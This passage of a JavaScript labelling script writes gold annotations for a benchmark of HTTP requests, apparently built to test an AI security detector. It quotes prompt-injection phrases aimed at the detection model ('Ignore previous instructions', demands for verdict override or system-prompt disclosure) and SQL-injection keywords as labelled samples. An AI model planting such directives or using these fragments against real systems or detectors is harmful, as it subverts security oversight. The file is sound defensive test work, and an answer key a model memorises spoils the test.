    rationale: '处置备注为带工单号的完整安全叙述，攻击串仅作举例存储，属典型易误报的正常安全运营记录。',
    review: 'hard negative: payload quoted inside operational documentation; storage-vs-execution position must be confirmed',
  });
});

// =========================================================================
// 270-274: WAF detection rules authored in the rules editor (hard negatives)
// =========================================================================
forEachId(range(270, 274), (s) => {
  put(s, {
    verdict: 'safe',
    attackFamily: 'none',
    action: 'monitor',
    ctx: true,
    conf: 4,
    evidence: [
      `POST /api/rules with body ${s.input.body}`,
      'the pattern field holds a detection regex describing an attack signature, which is precisely what a rules editor stores; action is "log" and enabled is false, so the rule is created inert',
      `${AUTH_SESSION}; ${SAME_ORIGIN} — rules authoring is a documented administrative capability of the platform`,
    ],
    alt: 'Rule creation is privileged, so an attacker with the console could author a permissive rule — but these rules only log and are disabled, granting nothing.',
    rationale: '在规则编辑器保存检测正则，动作为log且未启用，属安全规则维护的正常写入，不构成攻击。',
    review: 'hard negative: attack signatures inside detection-rule content; rule-authoring authorization should be confirmed',
  });
});

// =========================================================================
// 275-280: benign deployment scripts (approved=false)
// =========================================================================
forEachId(range(275, 280), (s) => {
  put(s, {
    verdict: 'safe',
    attackFamily: 'none',
    action: 'monitor',
    ctx: true,
    conf: 3,
    evidence: [
      `POST /api/deployments/deployment-runs with body ${s.input.body}`,
      'the script body is an inert staged-rollout stub (set -e, a comment, echo "deploying", exit 0) containing no download, no privilege change and no destructive command',
      'the record is submitted with "approved":false, i.e. it enters the pipeline as an unapproved run rather than executing immediately',
    ],
    alt: 'Submitting arbitrary shell to a deployment pipeline is inherently sensitive, so the caller entitlement matters even though this particular script is harmless.',
    rationale: '提交的部署脚本仅为echo占位且标记未批准，无危险指令，属正常发布流程投递，因涉及脚本入库建议监控。',
    review: 'script-submission capability: caller entitlement to the deployment pipeline is not observable from the request',
  });
});

// =========================================================================
// 281-285: analyst log-query fragments
// =========================================================================
forEachId(range(281, 285), (s) => {
  const frag = decodeURIComponent((s.input.path.split('query=')[1] || ''));
  put(s, {
    verdict: 'safe',
    attackFamily: 'none',
    action: 'monitor',
    ctx: true,
    conf: 3,
    evidence: [
      `GET ${s.input.path} — the query parameter carries the read-only analytics fragment [${frag}] against log data`,
      'the fragment contains no quote-breaking, no stacked statement, no UNION against another table and no write/DDL verb, so it reads as intended use of a query-style log filter',
      `${AUTH_SESSION}; ${SAME_ORIGIN}`,
    ],
    alt: 'If the query parameter is concatenated into a backend SQL statement, even a read-only fragment would represent injection surface; the parameter semantics are not visible in the request.',
    rationale: '日志检索的 query 参数为只读统计片段，无闭合引号、堆叠语句或写操作，判为日志查询正常用法。',
    review: 'SQL-shaped fragment in a query parameter: intended query-language field vs injection surface not distinguishable from the request',
  });
});

// =========================================================================
// 286-293, 304-306: KB articles / postmortems quoting payloads
// =========================================================================
forEachId([...range(286, 293), ...range(304, 306)], (s) => {
  const isPostmortem = s.input.body.includes('postmortem');
  put(s, {
    verdict: 'safe',
    attackFamily: 'none',
    action: 'monitor',
    ctx: true,
    conf: 4,
    evidence: [
      `POST ${s.input.path} with a note containing ${isPostmortem ? 'an incident postmortem narrative' : 'a Markdown security KB article with headed sections'} that quotes payload examples`,
      isPostmortem
        ? 'the text states root cause and remediation ("Remediated via parameterized queries"), i.e. it documents a fixed defect rather than attempting one'
        : 'the payloads appear inside Markdown code fences under explanatory headings (## SQLi / ## XSS / ## Path traversal), a documentation structure rather than an execution attempt',
      `${AUTH_SESSION}; ${SAME_ORIGIN} — a free-text note field on an alert-triage action`,
    ],
    alt: 'The literal payload strings are present, so a naive keyword detector would flag them; the surrounding structure shows they are being stored as reference text.',
    rationale: '备注为带标题与代码块的安全知识库或事故复盘文本，载荷仅作举例，属典型硬负例正常写入。',
    review: 'hard negative: documentation text containing payload examples; stored-vs-rendered handling should be confirmed',
  });
});

// =========================================================================
// 307-316: prompt injection in a search parameter
// =========================================================================
forEachId(range(307, 316), (s) => {
  const directive = decodeURIComponent((s.input.path.split('search=')[1] || ''));
  put(s, {
    verdict: 'attack',
    attackFamily: 'prompt_injection',
    action: 'block',
    ctx: true,
    conf: 4,
    evidence: [
      `GET ${s.input.path} — the search value is the model-directed imperative "${directive}"`,
      'the text addresses a classifier rather than the data set: it demands a verdict override, an approval, or a system-prompt disclosure, none of which any search of agent records would need',
      `${AUTH_SESSION}; ${SAME_ORIGIN} — the value is planted where an AI detection layer will read it as context`,
    ],
    alt: 'An analyst could genuinely search for such a phrase while hunting prompt-injection incidents, but this value is a complete directive addressed to the model, not a lookup keyword.',
    rationale: '检索参数为面向模型的完整指令，要求覆盖判定或泄露系统提示，属针对检测层的提示注入。',
    review: 'prompt injection: manipulation of the detection model itself',
  });
});

// =========================================================================
// 317-328: prompt injection in note/comment body fields
// =========================================================================
forEachId(range(317, 328), (s) => {
  put(s, {
    verdict: 'attack',
    attackFamily: 'prompt_injection',
    action: 'block',
    ctx: true,
    conf: 4,
    evidence: [
      `POST ${s.input.path} with body ${s.input.body} — both note and comment carry model-directed override instructions and no operational content`,
      'the strings demand a benign verdict, admin mode or system-prompt disclosure, i.e. they attack the analysis layer that later reads the stored record',
      `${AUTH_SESSION}; ${SAME_ORIGIN}`,
    ],
    alt: 'Stored text alone changes no system state, but planting model-override directives in fields an AI pipeline ingests is an injection attempt regardless of storage.',
    rationale: '处置备注与评论均为面向模型的覆盖指令且无业务内容，属存储型提示注入。',
    review: 'prompt injection: stored payload targeting downstream AI analysis',
  });
});

// =========================================================================
// 329-340: prompt injection via User-Agent / X-Note headers
// =========================================================================
forEachId(range(329, 340), (s) => {
  const note = decodeURIComponent(s.input.headers['X-Note'] || '');
  put(s, {
    verdict: 'attack',
    attackFamily: 'prompt_injection',
    action: 'block',
    ctx: true,
    conf: 4,
    evidence: [
      `GET /api/auth/me carrying X-Note and User-Agent both set to the model-directed instruction [${note}]`,
      'a User-Agent is a client-identification field; replacing it with an instruction addressed to a model targets whatever component summarises request metadata, not the web server',
      `${AUTH_SESSION}; ${SAME_ORIGIN} — the request path itself is a harmless identity read, so the payload lives entirely in the headers`,
    ],
    alt: 'Header text is inert to the API itself; the attempt only matters where logs or metadata are fed to a model, but the intent to steer that model is explicit.',
    rationale: '将模型指令植入 User-Agent 与 X-Note 头部，请求路径本身无害，载荷针对读取元数据的分析组件，属提示注入。',
    review: 'prompt injection via request headers targeting metadata-consuming analysis',
  });
});

// =========================================================================
// 341-348: prompt injection in upload filename
// 349-356: prompt injection in upload content
// =========================================================================
forEachId(range(341, 348), (s) => {
  put(s, {
    verdict: 'attack',
    attackFamily: 'prompt_injection',
    action: 'block',
    ctx: true,
    conf: 4,
    evidence: [
      `POST /api/devices/firmware with body ${s.input.body} — the filename is a model-directed instruction with a .bin suffix appended`,
      'the content is a benign marker string, so the payload value lies in the filename that a downstream review or triage model would read',
      `${AUTH_SESSION}; ${SAME_ORIGIN}`,
    ],
    alt: 'The file itself is inert, but a filename shaped as "Ignore previous instructions ... .bin" has no legitimate firmware-naming purpose.',
    rationale: '固件文件名被构造为面向模型的覆盖指令，内容为无害标记，属经文件名投递的提示注入。',
    review: 'prompt injection via upload filename consumed by downstream analysis',
  });
});

forEachId(range(349, 356), (s) => {
  const directive = (JSON.parse(s.input.body).content || '').split('\n')[0];
  put(s, {
    verdict: 'attack',
    attackFamily: 'prompt_injection',
    action: 'block',
    ctx: true,
    conf: 4,
    evidence: [
      `POST /api/devices/firmware with body ${s.input.body} — the filename is an ordinary fw-N.bin while the content is the model-override instruction [${directive}]`,
      'a firmware image would be binary; shipping a human-readable directive as file content targets the analysis pipeline that inspects uploads',
      `${AUTH_SESSION}; ${SAME_ORIGIN}`,
    ],
    alt: 'The upload cannot execute as firmware, but the content is written specifically to steer an inspecting model.',
    rationale: '固件内容为面向模型的判定覆盖指令而非二进制镜像，针对上传检查环节，属提示注入。',
    review: 'prompt injection via upload content consumed by downstream analysis',
  });
});

// =========================================================================
// 357-362: prompt injection in a rule name + catch-all pattern
// =========================================================================
forEachId(range(357, 362), (s) => {
  put(s, {
    verdict: 'attack',
    attackFamily: 'prompt_injection',
    action: 'block',
    ctx: true,
    conf: 4,
    evidence: [
      `POST /api/rules with body ${s.input.body} — the rule name is a model-directed override instruction rather than a descriptive rule title`,
      'unlike the legitimate rule submissions on this endpoint, the pattern is the catch-all ".*" and carries no detection semantics, so the record exists only to place instruction text into the rules corpus',
      `${AUTH_SESSION}; ${SAME_ORIGIN}`,
    ],
    alt: 'It is stored as a disabled log-only rule and blocks nothing by itself, but the name is written to steer a model that reads rule metadata.',
    rationale: '规则名称为面向模型的覆盖指令且模式为无意义的.*，无检测语义，属向规则库植入提示注入。',
    review: 'prompt injection planted in security-rule metadata',
  });
});

// =========================================================================
// 363-369: unauthenticated reads of protected endpoints
// =========================================================================
forEachId(range(363, 369), (s) => {
  const p = s.input.path;
  const isIdentity = p === '/api/auth/me';
  const kind = isIdentity
    ? 'the session-identity endpoint'
    : p.startsWith('/api/admin/')
      ? 'an administrative user-directory listing'
      : 'a tenant business-data listing';
  if (isIdentity) {
    // A SPA calls /api/auth/me precisely to discover it is logged out; this is
    // the one protected path where an anonymous hit is the normal control flow.
    put(s, {
      verdict: 'safe',
      attackFamily: 'none',
      action: 'monitor',
      ctx: true,
      conf: 3,
      evidence: [
        'GET /api/auth/me with sourceContext.authenticated=false, no parameters and body=null',
        'an unauthenticated identity check is the standard way a single-page app discovers that it has no session and must redirect to login',
        SAME_ORIGIN,
      ],
      alt: 'The same call is how an attacker tests whether a stolen cookie is still valid, so it is worth logging even though it returns no tenant data.',
      rationale: '未认证调用身份查询端点，属前端判定登录态的常规流程，无参数无载荷，仅建议留痕。',
    });
    return;
  }
  put(s, {
    verdict: 'unknown',
    attackFamily: 'authentication',
    action: 'challenge',
    ctx: false,
    conf: 2,
    evidence: [
      `GET ${p} with sourceContext.authenticated=false — ${kind} requested without an established session`,
      'endpoint-inventory.json places this path on the authenticated /api surface, so the request asks for data outside any session scope',
      `${SAME_ORIGIN} — the request originates from the application own front-end, which is also what an expired-session browser tab looks like`,
    ],
    alt: 'A legitimate dashboard whose session expired (or which loaded before login) issues exactly this request and is simply refused.',
    rationale: '未认证请求受保护数据端点，会话过期后的前端重试与刻意越权探测两种解释均成立，单条请求无法区分。',
    review: 'anonymous access to a protected endpoint: expired-session client retry vs deliberate probing not separable from a single request',
  });
});

// =========================================================================
// 370-373: truncated JSON bodies (unauthenticated)
// =========================================================================
forEachId(range(370, 373), (s) => {
  put(s, {
    verdict: 'unknown',
    attackFamily: 'unknown',
    action: 'challenge',
    ctx: false,
    conf: 2,
    evidence: [
      `POST ${s.input.path} with body {"email":"test — the JSON is cut off mid-string and never closes`,
      `${ANON}; ${SAME_ORIGIN}`,
      'a truncated body is equally consistent with a parser fuzz probe, a client serialisation bug and a transport-level cut; the intended payload cannot be recovered from what was sent',
    ],
    alt: 'Benign client or network truncation of an otherwise ordinary form submission.',
    rationale: '请求体JSON被截断且无法还原原始内容，畸形输入模糊测试与客户端缺陷均成立，证据不足以判定。',
    review: 'truncated/incomplete request body: original payload unrecoverable',
  });
});

// =========================================================================
// 374-380: malformed / empty bodies on an alert action (authenticated)
// =========================================================================
const malformedNotes = {
  374: ['body is the raw percent-encoded sequence %E9%83%BD rather than JSON', 'an encoded non-ASCII fragment sent as a body tests charset/decoder handling'],
  375: ['body is %ZZ%XX, an invalid percent-encoding that no decoder can resolve', 'malformed escape sequences target the decoding layer'],
  376: ['body is {"a":"b" — a JSON object missing its closing brace', 'the truncated structure targets parser error handling'],
  377: ['body is the literal string "null" rather than a JSON object', 'a null-literal body tests how the handler treats an absent payload'],
  378: ['body is an empty string with no content at all', 'an empty body on a POST tests required-field validation'],
  379: ['body is the literal string "undefined", a JavaScript serialisation artefact', 'this is the classic signature of a client bug stringifying an undefined variable'],
  380: ['body is [1,2, — a truncated array literal', 'the unterminated array targets parser error handling'],
};
forEachId(range(374, 380), (s, n) => {
  const [what, why] = malformedNotes[n];
  put(s, {
    verdict: 'unknown',
    attackFamily: 'unknown',
    action: 'challenge',
    ctx: false,
    conf: 2,
    evidence: [
      `POST /api/alerts/[RESOURCE_ID_727DAE3A]/acknowledge where the ${what}`,
      why,
      `${AUTH_SESSION}; ${SAME_ORIGIN} — the payload carries no injection syntax, only structural damage`,
    ],
    alt: 'A defective client or a broken serialisation step produces exactly these bodies without any malicious intent.',
    rationale: '请求体结构畸形且无注入语法，解析器模糊测试与客户端序列化缺陷两种解释均成立，无法可靠判定。',
    review: 'malformed/empty body: parser fuzzing vs client defect indistinguishable from the request alone',
  });
});

// =========================================================================
// 381-392: ambiguous single-word search terms
// =========================================================================
const ambiguousTerms = {
  381: "it's a test",
  382: 'a;b',
  383: 'select all',
  384: 'union',
  385: 'drop table',
  386: 'admin',
  387: 'root',
  388: 'test or test',
  389: '-- comment',
  390: 'waitfor delay',
  391: 'sleep',
  392: 'exec',
};
forEachId(range(381, 392), (s, n) => {
  const term = ambiguousTerms[n];
  const structural = [382, 389].includes(n); // contains a metacharacter/comment marker
  const quoted = n === 381;
  put(s, {
    verdict: 'safe',
    attackFamily: 'none',
    action: 'monitor',
    ctx: true,
    conf: 3,
    evidence: [
      `GET /api/agents?search=${encodeURIComponent(term)} — the term is "${term}", a bare word or fragment with no complete injection structure`,
      quoted
        ? 'the apostrophe appears inside an ordinary English phrase, which is exactly the false-positive case a naive quote-detector produces'
        : structural
          ? 'the value carries a lone separator/comment marker with no statement before or after it, so nothing is actually chained or commented out'
          : 'SQL keywords appear alone without a quote break, operator or second clause, so the value cannot alter a query even if interpolated',
      `${AUTH_SESSION}; ${SAME_ORIGIN} — an agent-listing search field`,
    ],
    alt: 'These terms are the vocabulary of injection payloads, so they may be a deliberate probe of the detector threshold; as sent they lack the syntax to affect a query.',
    rationale: '检索词为孤立关键字或含撇号的普通短语，缺少闭合与子句结构无法改变查询，判为易误报的边界检索，建议留痕。',
    review: 'hard negative near the detection threshold: keyword-shaped search term without injection structure',
  });
});

// =========================================================================
// 393-396: benign scanner targets
// =========================================================================
const scannerTargets = {
  393: ['http://192.168.3.140:5173', 'the target is the application host itself, i.e. a self-scan of the system under management'],
  394: ['http://example.test', 'the target is a reserved documentation/test domain that resolves to nothing sensitive'],
  395: ['http://10.0.0.1', 'the target is a private-range address supplied as a scan subject; whether it is in the authorized scan scope is not stated in the request'],
  396: ['https://aetherguard.local', 'the target is the product own .local hostname, consistent with scanning managed infrastructure'],
};
forEachId(range(393, 396), (s, n) => {
  const [target, why] = scannerTargets[n];
  const isPrivateThirdParty = n === 395;
  put(s, {
    verdict: isPrivateThirdParty ? 'unknown' : 'safe',
    attackFamily: isPrivateThirdParty ? 'unknown' : 'none',
    action: isPrivateThirdParty ? 'challenge' : 'monitor',
    ctx: !isPrivateThirdParty,
    conf: isPrivateThirdParty ? 2 : 3,
    evidence: [
      `POST /api/scanner with body {"target":"${target}"} — a single target field, no url/webhook duplication and no non-HTTP scheme`,
      why,
      `${AUTH_SESSION}; ${SAME_ORIGIN} — submitting a scan target is the documented purpose of this endpoint`,
    ],
    alt: isPrivateThirdParty
      ? 'A legitimate internal asset scan and an SSRF probe against an unowned internal host are the same bytes; only the authorized scope list distinguishes them.'
      : 'Any scanner endpoint can be abused for SSRF, but these targets are the application own hosts or a reserved test domain.',
    rationale: isPrivateThirdParty
      ? '扫描目标为内网地址，是否在授权扫描范围内需依赖允许列表，正常资产扫描与SSRF探测无法区分。'
      : '扫描目标为自身应用主机或保留测试域名，属扫描器的正常用途，建议留痕。',
    review: isPrivateThirdParty ? 'authorized-scope allowlist for internal scan targets is not available in the request' : undefined,
  });
});

// =========================================================================
// 397-404: near-miss SQL-flavoured notes on an alert action
// =========================================================================
forEachId(range(397, 404), (s) => {
  const body = JSON.parse(s.input.body);
  put(s, {
    verdict: 'unknown',
    attackFamily: 'sqli',
    action: 'challenge',
    ctx: false,
    conf: 2,
    evidence: [
      `POST ${s.input.path} with body ${s.input.body}`,
      `the note "${body.note}" carries injection-shaped tokens (quote, or, -- , ; , #) but its predicate is the bare integer ${body.q.replace('select ', '')} rather than a comparison, so it forms no complete tautology`,
      `${AUTH_SESSION}; ${SAME_ORIGIN} — the values sit in a free-text note plus a "q" field whose parsing role is not observable from the request`,
    ],
    alt: 'It reads equally as a deliberately-crafted borderline probe of the detector and as scratch text pasted into a note during a false-positive investigation.',
    rationale: '备注含引号与注释符但谓词残缺不构成恒真式，且 q 字段是否被解析未知，探测与随手记录两种解释都成立。',
    review: 'near-miss injection syntax in an ambiguous field: detector-probing vs analyst scratch text unresolved',
  });
});

// =========================================================================
// 405-409: fine-grained paging; 410-412: type-confusion / parameter shape
// =========================================================================
forEachId(range(405, 409), (s) => {
  put(s, {
    verdict: 'safe',
    attackFamily: 'none',
    action: 'allow',
    ctx: true,
    conf: 4,
    evidence: [
      `GET ${s.input.path} — sequential single-record paging (limit=1, page 1..5) on the device listing`,
      `${AUTH_SESSION}; ${SAME_ORIGIN}`,
      'parameters are plain integers within normal bounds and the endpoint is a tenant-scoped list the tested role may read',
    ],
    alt: 'One-record-per-page iteration is also how a scripted harvest walks a list, so volume monitoring at the session level remains sensible.',
    rationale: '逐条翻页读取设备列表，参数为正常整数且范围受租户限制，属分页读取。',
  });
});

put(byNum.get(410), {
  verdict: 'unknown',
  attackFamily: 'unknown',
  action: 'challenge',
  ctx: false,
  conf: 2,
  evidence: [
    'POST /api/alerts/[RESOURCE_ID_727DAE3A]/acknowledge with body {"note":12345,"severity":"maybe","active":"true"} — every field carries the wrong JSON type (number for text, free word for an enum, string "true" for a boolean)',
    'string "true" in a boolean slot is the classic truthiness-coercion probe, but it is also what a form serialiser emits by default',
    `${AUTH_SESSION}; ${SAME_ORIGIN} — no injection syntax is present, only type mismatches`,
  ],
  alt: 'A weakly-typed client that serialises every field as a string produces this body without malicious intent.',
  rationale: '各字段类型全部错配，含布尔真值强制转换的经典探测形态，但也符合弱类型客户端序列化，无法判定。',
  review: 'type-confusion probing vs client serialisation defect indistinguishable from the request',
});

put(byNum.get(411), {
  verdict: 'safe',
  attackFamily: 'none',
  action: 'monitor',
  ctx: true,
  conf: 3,
  evidence: [
    'GET /api/agents?sort[]=name&filter[a]=b — bracket-notation array/object query syntax',
    'bracket parameters are standard qs/Express query parsing and are emitted by ordinary front-end query builders; the values "name" and "b" are inert',
    `${AUTH_SESSION}; ${SAME_ORIGIN}`,
  ],
  alt: 'Nested query notation is also the entry point for parameter-pollution and prototype-pollution probing, so it is worth logging even though the values here are harmless.',
  rationale: '括号数组/对象查询语法属常规查询解析，取值无害，但该形态可用于参数污染探测，建议留痕。',
});

put(byNum.get(412), {
  verdict: 'safe',
  attackFamily: 'none',
  action: 'allow',
  ctx: true,
  conf: 4,
  evidence: [
    'GET /api/agents?unknownparam=value — a single unrecognised query parameter with an inert value',
    'unknown parameters are routinely ignored by API handlers and this one carries neither injection syntax nor scope-widening semantics',
    `${AUTH_SESSION}; ${SAME_ORIGIN}`,
  ],
  alt: 'Unknown parameters can be used to fingerprint framework behaviour, but nothing here alters the query scope.',
  rationale: '附带一个无法识别且取值无害的查询参数，不改变数据范围，属正常列表读取。',
});

// ---------------------------------------------------------------- output ---
const missing = rows.filter((r) => !ann.has(r.sampleId));
if (missing.length) {
  console.error(`UNASSIGNED (${missing.length}):`, missing.slice(0, 20).map((m) => m.sampleId).join(', '));
  process.exit(1);
}

const lines = rows.map((r) => JSON.stringify(ann.get(r.sampleId)));
fs.writeFileSync(OUT_JSONL, lines.join('\n') + '\n', 'utf8');
console.log(`wrote ${lines.length} annotations -> ${OUT_JSONL}`);
